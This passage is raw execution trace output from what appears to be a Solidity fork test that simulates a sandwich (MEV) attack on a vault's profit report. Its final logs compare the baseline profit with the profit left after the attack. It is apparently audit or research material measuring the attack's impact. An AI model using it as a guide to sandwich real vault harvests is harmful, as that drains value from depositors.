    │   │   │   │   │   │   │   ├─ [3781] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 3033847496599926410526 [3.033e21]
    │   │   │   │   │   │   └─ ← [Return] 3033847496599926410526 [3.033e21]
    │   │   │   │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, param2: -808477226023 [-8.084e11], param3: 1000000000000000000000 [1e21], param4: 4295689826337085610132137655690011 [4.295e33], param5: 31785515787949597 [3.178e16], param6: 218026 [2.18e5])
    │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffffffffffffffff43c3008bd900000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   │   │   └─ ← [Return] 808477226023 [8.084e11]
    │   │   │   ├─ [3079] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   └─ ← [Return] 30363683513771595986006474 [3.036e25]
    │   │   │   ├─ [443712] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::convertToAssets(30363683513771595986006474 [3.036e25]) [staticcall]
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xd0c4173c1dd1f30c5c927c8b9f98294294be1292ebd41e1eafbbcba1028343db]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000563132900ccc0
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000608f705d7800000000000000000000000000000000000000000000000005c164b44e384e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000069280c250000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000913da6da4b42f538b445599b46bb4622342cf52000000000000000000000000b60f728bdce5e3921c0e42c1a6f07a1313d0040e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4b807718ccf367383077da1df57347d73f5163a5f2eea67b5418bf3d6c4171c7]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000007a8a8f5c473200f4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020b3ae018518000000000000000000000000000000000000000000000001ef6d7293d22ee54f0000000000000000000000000000000000000000000000000000158f4b615d64000000000000000000000000000000000000000000000001464051873271a546000000000000000000000000000000000000000000000000000000006927febf0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x0913DA6Da4b42f538B445599b46Bb4622342Cf52, 0xB60F728BdcE5e3921C0E42c1a6F07A1313D0040e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (35956090570008 [3.595e13], 35699315800447837519 [3.569e19], 23705189178724 [2.37e13], 23508879695982732614 [2.35e19], 1764228799 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000029a8afc2
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ee7d8bcfb72bc1880d0cf19822eb0a2e6577ab62000000000000000000000000d423d353f890ad0d18532ffaf5c47b0cb943bf470000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x6134b6f30fc70b7fbe09c812e3b24a4f48945ade04e59f00f06a48a72dfc3d2b]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000003076863c5e325992
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000a25e2d2b25b00000000000000000000000000000000000000000000000099c0f082365ae7c7000000000000000000000000000000000000000000000000000007c4ce9e9b9f0000000000000000000000000000000000000000000000007592d837e65822d8000000000000000000000000000000000000000000000000000000006927ea4c0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xD423D353f890aD0D18532fFaf5c47B0Cb943bf47, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (11157835526747 [1.115e13], 11079119525379762119 [1.107e19], 8541861485471 [8.541e12], 8472071583636660952 [8.472e18], 1764223564 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000002716f446
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ecac9c5f704e954931349da37f60e39f515c11c1000000000000000000000000cc139318686969b9d30dd62aa206725b269da40d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xb5b837c74fa6806002fd3a23501b416c4fc7547bf974b0637785fa225b3fbff8]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001277b17479200000000000000000000000000000000000000000000000011648dcd67ed96d7000000000000000000000000000000000000000000000000000000b4cb5f32490000000000000000000000000000000000000000000000000a9f5ac178edcf8f00000000000000000000000000000000000000000000000000000000692803500000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xecAc9C5F704e954931349Da37F60E39f515c11c1, 0xcC139318686969b9D30Dd62aA206725B269DA40d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (1269080475538 [1.269e12], 1253282509667276503 [1.253e18], 776506126921 [7.765e11], 765430248680312719 [7.654e17], 1764229968 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000245e1dc3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000b0f70c0bd6fd87dbeb7c10dc692a2a610681707200000000000000000000000083f4197076614efe8e4c37bb9efbfead08d4719f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x115a2c52309574a8b3a9fb502ff331a302403942beaee5db1149ca0fd276f620]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000055f599b3f7000000000000000000000000000000000000000000000000050ea42e8860930c000000000000000000000000000000000000000000000000000000112b62c49b00000000000000000000000000000000000000000000000001025abedbf6c81d000000000000000000000000000000000000000000000000000000006926dd6e0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xB0F70C0bD6FD87dbEb7C10dC692a2a6106817072, 0x83F4197076614efe8e4c37BB9EFBfeaD08d4719f, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (369192711159 [3.691e11], 364409139627070220 [3.644e17], 73742337179 [7.374e10], 72720319772018717 [7.272e16], 1764154734 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000c98017
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009a6bd7b6fd5c4f87eb66356441502fc7dcdd185b000000000000000000000000d978ce03d8bb0eb3f09cb2a469dbbc25db42f3ae0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x113b019b1a1ae6ebb77894d50fd7fd4bd87f532c42648cd3ec74849ce6a17ce6]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000476d0281656d22c4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000070de2cbb0d60000000000000000000000000000000000000000000000006a1a5366185e7bbd00000000000000000000000000000000000000000000000000000616422ea6460000000000000000000000000000000000000000000000005b6064184c60d965000000000000000000000000000000000000000000000000000000006927c2c70000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9A6bd7B6Fd5C4F87eb66356441502fc7dCdd185B, 0xD978CE03d8BB0eb3f09cB2a469DbbC25DB42F3Ae, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (7756220969174 [7.756e12], 7645515015375453117 [7.645e18], 6692669400646 [6.692e12], 6584372710739073381 [6.584e18], 1764213447 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004e17518a
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000e007ca01894c863d7898045ed5a3b4abf0b18f37000000000000000000000000aa9853c78b92606b21ce57da7f04f301f031aba40000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x29e239c68a4f6dc6a3d25deacb5cfad26fceeee1fcd52545613bfd97aaf9896c]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000786514945491fe7c
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000acf2cb52521000000000000000000000000000000000000000000000000a3584bf474dc21750000000000000000000000000000000000000000000000000000093583778dbc0000000000000000000000000000000000000000000000008afb4ba01d3ef1b500000000000000000000000000000000000000000000000000000000692804690000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xE007CA01894c863d7898045ed5A3B4Abf0b18f37, 0xaa9853c78B92606b21cE57Da7F04F301f031Aba4, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (11884924577057 [1.188e13], 11770241139437478261 [1.177e19], 10125443567036 [1.012e13], 10014681347445944757 [1.001e19], 1764230249 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000050b9111e
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009893989433e7a383cb313953e4c2365107dc19a70000000000000000000000009b32a1859fe79fe76f8c1b771664b28852c3718c0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x345b7096db6c387717f255f209ff2e8d7c4abcac7effae88e09e9cdc4024e5c1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000026ffb95218000000000000000000000000000000000000000000000000025312e62207118c0000000000000000000000000000000000000000000000000000000343ddf9850000000000000000000000000000000000000000000000000031d21e3deedf6d000000000000000000000000000000000000000000000000000000006926a5ab0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9893989433e7a383Cb313953e4c2365107dc19a7, 0x9b32a1859FE79fE76F8C1B771664b28852c3718c, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (167499092504 [1.674e11], 167498390765506956 [1.674e17], 14023522693 [1.402e10], 14023301188738925 [1.402e16], 1764140459 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000009ab8a4
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000aa0362ecc584b985056e47812931270b99c91f9d00000000000000000000000029bdd31828260de15f6431410da3a24c1851d80e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4ac2d4b58754e8a4005e379d3df2c3373511409c90c276cc5ab0ec77dc392044]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000c89c02a2f58fa5b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000d3cc875d650000000000000000000000000000000000000000000000000c89c1307e0c2564000000000000000000000000000000000000000000000000000000be9e79d9980000000000000000000000000000000000000000000000000b45e4412f7bd5d7000000000000000000000000000000000000000000000000000000006925fb000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xAa0362eCC584B985056E47812931270b99C91f9d, 0x29Bdd31828260DE15f6431410da3a24c1851d80e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (909669522789 [9.096e11], 903465614281811300 [9.034e17], 818702571928 [8.187e11], 812306276430894551 [8.123e17], 1764096768 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003cc9c1c3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd3600000000000000000000000093fec6639717b6215a48e5a72a162c50dcc40d680000000000000000000000002c6204aedcc71a4eb373820248f513a4e91be62f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x47fb97f2ba64cf8699ba25ede739a84eaa55353414173aa6ee718cee7797a3b2]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002d53913026d5977e
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000002fc84b19a2b0000000000000000000000000000000000000000000000002d5391a491281f7e000000000000000000000000000000000000000000000000000002b0110d268c00000000000000000000000000000000000000000000000028c444e861476525000000000000000000000000000000000000000000000000000000006927f8c50000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x93Fec6639717b6215A48E5a72a162C50DCC40d68, 0x2c6204aEDCC71A4EB373820248F513A4e91be62F, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (3283581245995 [3.283e12], 3266114290769731454 [3.266e18], 2955223574156 [2.955e12], 2937548621807576357 [2.937e18], 1764227269 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004685cedc
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000007fb4d0f51544f24f385a421db6e7d4fc71ad8e5c0000000000000000000000001c5f3862c913e015ed0a2a9d71e13be74101f47d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x8f8a620965b5e63c41a83de86019fb16d5a0ff0ebc3ec00e35c582be79d5b515]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000022e08b5574000000000000000000000000000000000000000000000000016cbe8086f824b300000000000000000000000000000000000000000000000000000000dcaa04760000000000000000000000000000000000000000000000000008b6178c8348fa00000000000000000000000000000000000000000000000000000000692760ee0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x7Fb4D0f51544F24F385a421Db6e7D4fC71Ad8e5C, 0x1c5f3862c913E015eD0a2A9d71E13BE74101F47d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (149796115828 [1.497e11], 102666350752179379 [1.026e17], 3702129782 [3.702e9], 2452012071602426 [2.452e15], 1764188398 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000018a210cb
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000005bff88ca1442c2496f7e475e9e7786383bc070c000000000000000000000000091a3030277b20c084aa83d4f8c8a714fd4e054ab0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000cb2bba6f17b8000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x91666dfc9cfeb8df5519318bc5b3d4d398a890ba98863cda55dd0c556a182672]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000007a32e000000000000000000000000000000000000000000000000000000746a528800000000000000000000000000000000000000000000000000000000000006dfe400000000000000000000000000000000000000000000000000000068c617140000000000000000000000000000000000000000000000000000000000690a5adb0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x5Bff88cA1442c2496f7E475E9e7786383Bc070c0, 0x91A3030277B20C084Aa83d4f8C8a714Fd4E054AB, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 915000000000000000 [9.15e17]), (500526 [5.005e5], 500000000000 [5e11], 450532 [4.505e5], 450000000000 [4.5e11], 1762286299 [1.762e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000466b698a
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001bce6978063a
    │   │   │   ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 808477226023 [8.084e11]
    │   │   │   │   └─ ← [Return] 808477226023 [8.084e11]
    │   │   │   ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   │   │   │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   │   │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001c8aa6777a61
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 801714427936 [8.017e11])
    │   │   ├─ emit Reported(: 814532325501 [8.145e11], : 0, : 0, : 0)
    │   │   └─ ← [Return] 814532325501 [8.145e11], 0
    │   └─ ← [Return] 814532325501 [8.145e11], 0
    ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 31381823912545 [3.138e13]
    │   └─ ← [Return] 31381823912545 [3.138e13]
    ├─ emit log_named_uint(key: "baseline profit (no MEV)", val: 1861689536584 [1.861e12])
    ├─ emit log_named_uint(key: "attacked profit (with sandwich)", val: 814532325501 [8.145e11])
